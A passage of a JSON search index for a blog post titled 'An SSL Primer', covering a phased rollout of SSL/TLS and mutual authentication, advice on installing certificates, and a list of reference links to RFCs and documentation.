1"},{"location":"Blog/2021-08-26-An-SSL-Primer/#phase-2","text":"Now that you have your newly modified code, Keystores and Truststores you can now move forward with implementing your Basic SSL configuration as defined in Phase 1. Once its been implemented your clients can then begin to adopt the Basic SSL configuration in their applications. Note that any client reaching out to this stack on the Basic SSL port will need to trust the certificate authorities that signed the certificate your using. As an example if you signed your certificate using the company CA they would need to trust that CA before they would be able to make a successful connection.","title":"Phase 2"},{"location":"Blog/2021-08-26-An-SSL-Primer/#phase-3","text":"Once Basic SSL has been adopted in Phase 2 the Mutual Authentication option can be implemented. In addition to the steps listed in Phase 2 your client will also need to implement a certificate on their side that is trusted by your system. In this case the CA they used to sign would need to be added to your Truststore if it doesn't already exist. Once implemented your client can then modify their config and adopt SSL/TLS Mutual Authentication. Note the configuration you implemented in Phase 2 may be different from Phase 3 consult your technologies manual pages for more information.","title":"Phase 3"},{"location":"Blog/2021-08-26-An-SSL-Primer/#phase-4","text":"This phase is optional based on your solution and plans. Once Phase 3 has been adopted widely and you have moved all of your clients to at least Phase 2 you can begin having discussions around shutting down your unencrypted port and making plans to implement that.","title":"Phase 4"},{"location":"Blog/2021-08-26-An-SSL-Primer/#how-do-i-install-an-ssltls-certificate-on-technology-x","text":"Unfortunately there is no straight answer to that question. The best advice I can give you is to review your applications specific manual pages to determine how to implement SSL/TLS on that platform as each technology is different. You can start by checking out the below links for various Domain Name Providers that may give you clues as to where to look in your specific technology. If after reviewing your manuals, documentation and links and no such information can be found hope is not lost you may still be able to implement SSL/TLS by way of a wrapper program such as stunnel which I have included the manual page to below. https://www.thesslstore.com/knowledgebase/ssl-install/ https://www.digicert.com/kb/ssl-certificate-installation.htm https://www.godaddy.com/help/install-ssl-certificates-16623 https://www.namecheap.com/support/knowledgebase/article.aspx/795/69/how-to-install-sslcertificates https://www.entrust.com/knowledgebase/ssl/how-to-generate-ecc-certificate-signingrequest-using-microsoft-management-console-mmc-on-microsoft-windows-2012 https://linux.die.net/man/8/stunnel","title":"How do I install an SSL/TLS Certificate on Technology X?"},{"location":"Blog/2021-08-26-An-SSL-Primer/#more-info","text":"Transport Layer Security - https://en.wikipedia.org/wiki/Transport_Layer_Security SSL 3.0 RFC - https://tools.ietf.org/html/rfc6101 TLS 1.0 RFC - https://tools.ietf.org/html/rfc2246 TLS 1.1 RFC - https://tools.ietf.org/html/rfc4346 TLS 1.2 RFC - https://tools.ietf.org/html/rfc5246 TLS 1.3 RFC - https://tools.ietf.org/html/rfc8446 TLS 1.0 & 1.1 Deprication RFC - https://tools.ietf.org/html/rfc8996 X.509 Format - https://en.wikipedia.org/wiki/X.509 Java Keystore - https://en.wikipedia.org/wiki/Java_KeyStore Java Keystore Java Doc - https://docs.oracle.com/javase/8/docs/api/java/security/KeyStore.html Certificate Authority - https://en.wikipedia.org/wiki/Certificate_authority Chains of Trust - https://en.wikipedia.org/wiki/Chain_of_trust Block Ciphers - https://en.wikipedia.org/wiki/Block_cipherStream Ciphers - https://en.wikipedia.org/wiki/Stream_cipher Hash Functions - https://en.wikipedia.org/wiki/Cryptographic_hash_function Forward Secrecy - https://en.wikipedia.org/wiki/Forward_secrecy OpenSSL - https://en.wikipedia.org/wiki/OpenSSL OpenSSL Man Page - https://linux.die.net/man/1/openssl Keytool - https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html Keytool Man Page - https://docs.oracle.com/en/java/javase/13/docs/specs/man/keytool.html","title":"More Info"}]}